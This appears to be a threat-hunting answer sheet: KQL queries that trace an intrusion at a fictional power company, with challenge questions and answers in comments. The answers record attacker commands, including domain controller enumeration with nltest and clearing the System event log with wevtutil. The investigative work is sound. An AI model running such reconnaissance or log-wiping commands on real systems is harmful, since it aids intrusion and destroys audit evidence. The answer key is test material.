Email
| where timestamp between ( datetime(2024-08-28) ..  datetime(2024-09-05))
| where sender contains "dissemblelebanon@aol.com" or sender contains "chopping_asbestosis@verizon.com" or sender contains "thresher_libero@hotmail.com" or sender contains "joseph_eisenman@chicagopowergrid.com" or sender contains "elizabeth_nunmaker@chicagopowergrid.com"
| where recipient contains "chicagopowergrid.com"
|distinct recipient

Employees
| where role contains "Operations Manager" or role contains "Network Administrator"

//What command was used to enumerate the list of domain controllers within the network?

ProcessEvents
| where hostname == "BDC0-DESKTOP"
| where process_commandline contains "list" //nltest /dclist:chicagogrid.local

//What file path did the attacker use to store the results of their password file search?

FileCreationEvents
| where hostname == "BDC0-DESKTOP"
| where path contains "pass" //C:\ProgramData\Password_Files.txt

//What upcoming corporate event did the threat actor browse on the chicagopowergrid.com website?

 InboundNetworkEvents
| where src_ip == "87.250.252.242" or src_ip == "104.244.42.129"
| where url contains "event" and url contains "chicagopowergrid.com"
//karaoke-night //https://chicagopowergrid.com/events/upcoming-corporate-karaoke-night/

//The attacker attempted to cover their tracks by clearing specific event logs. What command was used to clear the System event log?

ProcessEvents
| where timestamp > datetime(2024-08-27T08:31:28)
| where hostname contains "BDC0-DESKTOP"
| where process_commandline contains "system" and  process_commandline contains "cl"
//wevtutil cl System

